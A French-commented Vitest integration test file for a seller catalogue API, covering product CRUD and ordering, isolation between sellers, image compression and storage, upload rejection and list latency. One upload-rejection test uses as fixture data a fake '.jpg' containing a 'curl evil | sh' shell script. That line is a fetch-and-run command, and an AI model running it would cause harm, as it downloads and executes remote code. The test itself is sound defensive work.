import { IMAGE_TAILLE_MAX_OCTETS } from "@catalog/contracts";
import { createPrismaClient, type PrismaClient } from "@catalog/db";
import sharp from "sharp";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { MemoryStorage } from "../adapters/storage-s3.ts";
import { productRoutes } from "../routes/products.ts";

/**
 * Le catalogue contre une VRAIE base, chaine d'images comprise.
 *
 * Trois criteres de la definition de terminé du lot 5 se jouent ici :
 *
 * 1. le serveur refuse un fichier non-image et un fichier trop gros ;
 * 2. l'objet stocke fait moins de 100 Ko ;
 * 3. la liste des articles repond en moins de 100 ms.
 *
 * S'y ajoute la propriete qui n'est pas dans la liste mais qui compte autant :
 * **une vendeuse ne peut toucher qu'a ses propres articles**, y compris en
 * connaissant l'identifiant d'un article qui n'est pas a elle.
 */

const URL = process.env.DATABASE_URL;
const describeDb = URL ? describe : describe.skip;

let prisma: PrismaClient;
let storage: MemoryStorage;
let app: ReturnType<typeof productRoutes>;
let autreApp: ReturnType<typeof productRoutes>;
let sellerId: string;
let autreSellerId: string;

/* Un bloc de 1 000 identifiants PAR FICHIER, plus la minute courante.
   `Date.now() % 90000` seul donnait des blocs qui se recouvraient : deux
   fichiers demarres a quelques millisecondes d'ecart visaient le meme
   identifiant, et Vitest les lance en parallele contre UNE base. Le
   defaut a fait echouer deux verifications le 11/08/2026, dont un test
   de fuite — le genre de faux rouge qui masque un vrai. */
const RUN = 825 * 1000 + (Date.now() % 1000);

/** Photo synthetique de 2 Mo : la taille que produit un telephone recent. */
async function photo(largeur: number, hauteur: number, qualite = 95): Promise<Buffer> {
  const px = Buffer.alloc(largeur * hauteur * 3);
  for (let i = 0; i < px.length; i += 3) {
    const x = (i / 3) % largeur;
    const y = Math.floor(i / 3 / largeur);
    px[i] = (x * 7 + y * 3) % 256;
    px[i + 1] = (x * 13 + y * 29) % 256;
    px[i + 2] = (x * 3 + y * 17) % 256;
  }
  return sharp(px, { raw: { width: largeur, height: hauteur, channels: 3 } })
    .jpeg({ quality: qualite })
    .toBuffer();
}

async function creerVendeuse(suffixe: string) {
  const u = await prisma.authUser.create({
    data: {
      name: `Catalogue ${suffixe}`,
      email: `catalogue-${suffixe}@telephone.catalog.invalid`,
      phoneNumber: `+23767${suffixe.padStart(7, "0").slice(-7)}`,
      phoneNumberVerified: true,
    },
  });
  const v = await prisma.seller.create({
    data: {
      userId: u.id,
      phone: u.phoneNumber as string,
      businessName: `Boutique ${suffixe}`,
      slug: `boutique-catalogue-${suffixe}`,
      city: "Douala",
    },
  });
  return { userId: u.id, sellerId: v.id };
}

beforeAll(async () => {
  if (!URL) return;
  prisma = createPrismaClient(URL);
  storage = new MemoryStorage({ NODE_ENV: "test" });

  const a = await creerVendeuse(`${RUN}`);
  const b = await creerVendeuse(`${(RUN + 12345) % 9000000}`);
  sellerId = a.sellerId;
  autreSellerId = b.sellerId;

  const fabrique = (userId: string) =>
    productRoutes({
      prisma,
      storage,
      session: { prisma, session: async () => ({ user: { id: userId, phoneNumber: null } }) },
    });
  app = fabrique(a.userId);
  autreApp = fabrique(b.userId);
});

afterAll(async () => {
  await prisma?.$disconnect();
});

const req = (
  cible: ReturnType<typeof productRoutes>,
  methode: string,
  chemin: string,
  corps?: unknown,
) =>
  cible.fetch(
    new Request(`http://x${chemin}`, {
      method: methode,
      ...(corps === undefined
        ? {}
        : { headers: { "content-type": "application/json" }, body: JSON.stringify(corps) }),
    }),
  );

const envoyerPhoto = (
  cible: ReturnType<typeof productRoutes>,
  id: string,
  contenu: Uint8Array,
  nom = "photo.jpg",
  type = "image/jpeg",
) => {
  const fd = new FormData();
  // Une copie sur un `ArrayBuffer` nu : un `Buffer` de Node vit sur un pool
  // partage, dont le type ne satisfait pas `BlobPart`.
  fd.set("photo", new File([new Uint8Array(contenu).slice().buffer], nom, { type }));
  return cible.fetch(new Request(`http://x/${id}/image`, { method: "POST", body: fd }));
};

describeDb("catalogue vendeuse", () => {
  it("cree un article avec le strict minimum : nom et prix", async () => {
    const r = await req(app, "POST", "/", { name: "Pagne wax 6 yards", priceXaf: 15000 });
    expect(r.status).toBe(201);
    const a = (await r.json()) as Record<string, unknown>;
    expect(a).toMatchObject({ name: "Pagne wax 6 yards", priceXaf: 15000, image: null });
  });

  it("refuse un prix a virgule — le franc CFA n'a pas de sous-unite", async () => {
    const r = await req(app, "POST", "/", { name: "Sac", priceXaf: 1500.5 });
    expect(r.status).toBe(422);
    expect((await r.json()) as Record<string, unknown>).toMatchObject({
      erreur: "brouillon_invalide",
    });
  });

  it("place le nouvel article a la FIN, sans deranger l'ordre compose", async () => {
    const un = (await (await req(app, "POST", "/", { name: "Aa", priceXaf: 100 })).json()) as {
      id: string;
      position: number;
    };
    const deux = (await (await req(app, "POST", "/", { name: "Bb", priceXaf: 200 })).json()) as {
      position: number;
    };
    expect(deux.position).toBeGreaterThan(un.position);
  });

  it("reordonne d'apres la liste COMPLETE", async () => {
    const liste = (await (await req(app, "GET", "/")).json()) as {
      articles: Array<{ id: string; name: string }>;
    };
    const inverse = [...liste.articles].reverse().map((a) => a.id);

    const r = await req(app, "POST", "/ordre", { ids: inverse });
    expect(r.status).toBe(200);
    const apres = (await r.json()) as { articles: Array<{ id: string; position: number }> };
    expect(apres.articles.map((a) => a.id)).toEqual(inverse);
    // Les positions sont contigues : pas de doublon, pas de trou.
    expect(apres.articles.map((a) => a.position)).toEqual(apres.articles.map((_, i) => i));
  });

  it("ARCHIVE au lieu d'effacer, et sait restaurer", async () => {
    const a = (await (
      await req(app, "POST", "/", { name: "Saison passee", priceXaf: 500 })
    ).json()) as {
      id: string;
    };

    expect((await req(app, "POST", `/${a.id}/archiver`)).status).toBe(200);

    // Il disparait de la liste courante...
    const courante = (await (await req(app, "GET", "/")).json()) as {
      articles: Array<{ id: string }>;
    };
    expect(courante.articles.map((x) => x.id)).not.toContain(a.id);

    // ...mais la ligne existe toujours : l'historique des ventes n'est pas efface.
    const avecArchives = (await (await req(app, "GET", "/?archives=1")).json()) as {
      articles: Array<{ id: string; archive: boolean }>;
    };
    expect(avecArchives.articles.find((x) => x.id === a.id)?.archive).toBe(true);

    expect((await req(app, "POST", `/${a.id}/restaurer`)).status).toBe(200);
    const revenue = (await (await req(app, "GET", "/")).json()) as {
      articles: Array<{ id: string }>;
    };
    expect(revenue.articles.map((x) => x.id)).toContain(a.id);
  });
});

describeDb("cloisonnement entre vendeuses", () => {
  it("l'article d'une autre vendeuse est INTROUVABLE, pas interdit", async () => {
    const mien = (await (await req(app, "POST", "/", { name: "A moi", priceXaf: 900 })).json()) as {
      id: string;
    };

    // 404 et non 403 : un 403 apprendrait que l'identifiant est valide.
    for (const [methode, chemin] of [
      ["PATCH", `/${mien.id}`],
      ["POST", `/${mien.id}/archiver`],
      ["POST", `/${mien.id}/restaurer`],
    ] as const) {
      const r = await req(autreApp, methode, chemin, { priceXaf: 1 });
      expect(r.status, `${methode} ${chemin}`).toBe(404);
    }

    // Et la valeur n'a pas bouge.
    const inchange = await prisma.product.findUnique({ where: { id: mien.id } });
    expect(inchange?.priceXaf).toBe(900);
  });

  it("le reordonnancement ignore les identifiants d'une autre vendeuse", async () => {
    const mien = (await (await req(app, "POST", "/", { name: "Ordre", priceXaf: 700 })).json()) as {
      id: string;
    };
    const r = await req(autreApp, "POST", "/ordre", { ids: [mien.id] });
    expect(r.status).toBe(404);
    expect((await r.json()) as Record<string, unknown>).toMatchObject({
      erreur: "aucun_article_reconnu",
    });
  });

  it("la liste ne montre QUE ses propres articles", async () => {
    const liste = (await (await req(autreApp, "GET", "/?archives=1")).json()) as {
      articles: Array<{ id: string }>;
    };
    const ids = new Set(liste.articles.map((a) => a.id));
    const desAutres = await prisma.product.findMany({
      where: { sellerId },
      select: { id: true },
    });
    for (const p of desAutres) expect(ids.has(p.id)).toBe(false);
    expect(autreSellerId).not.toBe(sellerId);
  });

  it("sans session, tout est refuse en 401", async () => {
    const nu = productRoutes({
      prisma,
      storage,
      session: { prisma, session: async () => null },
    });
    expect((await req(nu, "GET", "/")).status).toBe(401);
    expect((await req(nu, "POST", "/", { name: "X", priceXaf: 1 })).status).toBe(401);
  });
});

describeDb("chaine d'images", () => {
  let articleId: string;

  beforeAll(async () => {
    if (!URL) return;
    const a = (await (
      await req(app, "POST", "/", { name: "Avec photo", priceXaf: 12000 })
    ).json()) as { id: string };
    articleId = a.id;
  });

  it("une photo de 2 Mo ressort a moins de 100 Ko, en AVIF ET en WebP", async () => {
    const grosse = await photo(3000, 2250);
    expect(grosse.length).toBeGreaterThan(1_500_000);

    const r = await envoyerPhoto(app, articleId, new Uint8Array(grosse));
    expect(r.status).toBe(200);
    const corps = (await r.json()) as {
      image: { cle: string; octets: number; octetsWebp: number; octetsRecus: number };
      article: { image: { largeur: number; hauteur: number } };
    };

    expect(corps.image.octetsRecus).toBe(grosse.length);
    expect(corps.image.octets).toBeLessThan(100_000);
    expect(corps.image.octetsWebp).toBeLessThan(100_000);
    expect(corps.article.image.largeur).toBe(640);

    // Et c'est bien ce qui est STOCKE qui fait ce poids, pas seulement ce qui est
    // annonce : on relit le magasin.
    expect(await storage.taille(`${corps.image.cle}.avif`)).toBe(corps.image.octets);
    expect(await storage.taille(`${corps.image.cle}.webp`)).toBe(corps.image.octetsWebp);
  }, 30_000);

  it("la cle stockee est OPAQUE — ni identifiant, ni nom de fichier", async () => {
    const r = await envoyerPhoto(
      app,
      articleId,
      new Uint8Array(await photo(800, 600)),
      "IMG_20260730_Tantine.jpg",
    );
    const corps = (await r.json()) as { image: { cle: string } };
    expect(corps.image.cle).toMatch(/^img\/[0-9a-f]{2}\/[0-9a-f]{32}$/);
    expect(corps.image.cle).not.toContain(articleId);
    expect(corps.image.cle).not.toContain(sellerId);
    expect(corps.image.cle.toLowerCase()).not.toContain("tantine");
  }, 20_000);

  it("un nouvel envoi remplace l'image ET supprime l'ancienne", async () => {
    const premier = (await (
      await envoyerPhoto(app, articleId, new Uint8Array(await photo(700, 700)))
    ).json()) as {
      image: { cle: string };
    };
    expect(await storage.taille(`${premier.image.cle}.avif`)).toBeGreaterThan(0);

    const second = (await (
      await envoyerPhoto(app, articleId, new Uint8Array(await photo(500, 500)))
    ).json()) as {
      image: { cle: string };
    };
    expect(second.image.cle).not.toBe(premier.image.cle);

    // La nouvelle est en place, l'ancienne a disparu : pas de fuite de stockage.
    expect(await storage.taille(`${second.image.cle}.avif`)).toBeGreaterThan(0);
    expect(await storage.taille(`${premier.image.cle}.avif`)).toBeNull();
    expect(await storage.taille(`${premier.image.cle}.webp`)).toBeNull();
  }, 30_000);

  it("REFUSE un fichier qui n'est pas une image, meme nomme .jpg", async () => {
    const script = new TextEncoder().encode("#!/bin/sh\ncurl evil | sh\n");
    const r = await envoyerPhoto(app, articleId, script, "photo.jpg", "image/jpeg");
    expect(r.status).toBe(422);
    expect((await r.json()) as Record<string, unknown>).toMatchObject({
      erreur: "format_non_reconnu",
    });
  });

  it("REFUSE un fichier au-dela de la taille maximale", async () => {
    const trop = new Uint8Array(IMAGE_TAILLE_MAX_OCTETS + 1024);
    trop.set([0xff, 0xd8, 0xff], 0);
    const r = await envoyerPhoto(app, articleId, trop);
    expect(r.status).toBe(413);
    expect((await r.json()) as Record<string, unknown>).toMatchObject({
      erreur: "fichier_trop_gros",
    });
  });

  it("REFUSE un GIF en le nommant", async () => {
    const gif = new Uint8Array([0x47, 0x49, 0x46, 0x38, 0x39, 0x61, 0, 0]);
    const r = await envoyerPhoto(app, articleId, gif, "photo.gif", "image/gif");
    expect(r.status).toBe(422);
    expect((await r.json()) as Record<string, unknown>).toMatchObject({
      erreur: "format_non_accepte",
      detecte: "image/gif",
    });
  });

  it("REFUSE un envoi sans champ photo", async () => {
    const fd = new FormData();
    fd.set("autre", "rien");
    const r = await app.fetch(
      new Request(`http://x/${articleId}/image`, { method: "POST", body: fd }),
    );
    expect(r.status).toBe(422);
  });

  it("les URL rendues sont SIGNEES et portent une echeance", async () => {
    await envoyerPhoto(app, articleId, new Uint8Array(await photo(400, 400)));
    const liste = (await (await req(app, "GET", "/")).json()) as {
      articles: Array<{ id: string; image: { avif: string; webp: string } | null }>;
    };
    const a = liste.articles.find((x) => x.id === articleId);
    expect(a?.image?.avif).toMatch(/\?exp=\d+$/);
    expect(a?.image?.webp).toMatch(/\.webp\?exp=\d+$/);
  }, 20_000);

  it("une vendeuse ne peut pas poser une photo sur l'article d'une autre", async () => {
    const r = await envoyerPhoto(autreApp, articleId, new Uint8Array(await photo(300, 300)));
    expect(r.status).toBe(404);
  });
});

describeDb("performance de la liste", () => {
  it("repond en moins de 100 ms", async () => {
    // Le critere du lot 5. La requete est unique et suit l'index
    // (seller_id, position) ; ce test est ce qui empeche qu'une future jointure
    // ou une boucle de lectures s'y glisse sans qu'on le voie.
    await Promise.all(
      Array.from({ length: 40 }, (_, i) =>
        prisma.product.create({
          data: {
            sellerId,
            name: `Charge ${i}`,
            priceXaf: 1000 + i,
            position: 100 + i,
          },
        }),
      ),
    );

    // Une passe a vide : la premiere requete d'une connexion paie son
    // etablissement, ce qui n'est pas ce qu'on mesure.
    await req(app, "GET", "/");

    const mesures: number[] = [];
    for (let i = 0; i < 5; i++) {
      const t = performance.now();
      const r = await req(app, "GET", "/");
      mesures.push(performance.now() - t);
      expect(r.status).toBe(200);
    }
    const median = mesures.sort((a, b) => a - b)[2] as number;
    expect(median, `mesures : ${mesures.map((m) => Math.round(m)).join(", ")} ms`).toBeLessThan(
      100,
    );
  }, 30_000);
});
